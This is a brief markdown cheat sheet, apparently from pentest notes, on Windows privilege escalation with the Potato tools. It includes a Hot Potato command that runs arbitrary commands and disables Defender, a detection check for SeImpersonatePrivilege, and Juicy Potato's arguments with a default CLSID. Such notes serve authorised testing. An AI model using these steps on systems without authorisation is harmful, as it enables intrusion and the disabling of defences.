---
title: POTATOS
category: win privesc
order: 1
---

# HOT POTATO
---
[WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)

Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true


# ROTTEN POTATO
---
[WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
 is  possible to escalate privileges from a service that is not running as SYSTEM but as a network service as well.

# JUICY POTATO
---
source: https://github.com/ohpe/juicy-potato
## detect
```
whoami /priv
SeImpersonatePrivilege  Enabled <- requirement or SeAssignPrimaryToken
```
## requirements  
* you need:
```
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) can peek anotherone from CLSIDs
```

# ROGUE POTATO  
---
https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
https://github.com/antonioCoco/RoguePotato
